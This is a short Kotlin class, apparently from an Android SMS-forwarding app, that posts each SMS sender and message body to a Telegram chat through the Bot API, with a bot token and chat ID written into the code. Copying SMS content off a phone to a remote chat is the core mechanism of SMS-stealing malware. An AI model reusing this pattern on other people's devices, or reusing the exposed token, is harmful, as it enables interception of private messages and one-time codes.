package com.example.smsforwarder

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

object TelegramService {
    // আপনার দেওয়া ক্রেডেনশিয়াল
    private const val BOT_TOKEN = "8523158193:AAE7LKktxM-vq13I1aoHqyID6BTdfTJUnv8"
    private const val CHAT_ID = "5967798239"

    suspend fun sendSmsToTelegram(sender: String, message: String) {
        withContext(Dispatchers.IO) {
            try {
                // মেসেজ ফরম্যাট করা
                val formattedText = "📩 *New SMS*\n\nFrom: $sender\nMessage: $message"
                val encodedText = URLEncoder.encode(formattedText, "UTF-8")
                
                // টেলিগ্রাম API URL
                val urlString = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=$encodedText&parse_mode=Markdown"
                
                val url = URL(urlString)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                
                // রিকোয়েস্ট পাঠানো
                val responseCode = conn.responseCode
                println("Telegram Response: $responseCode")
                
                conn.disconnect()
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}
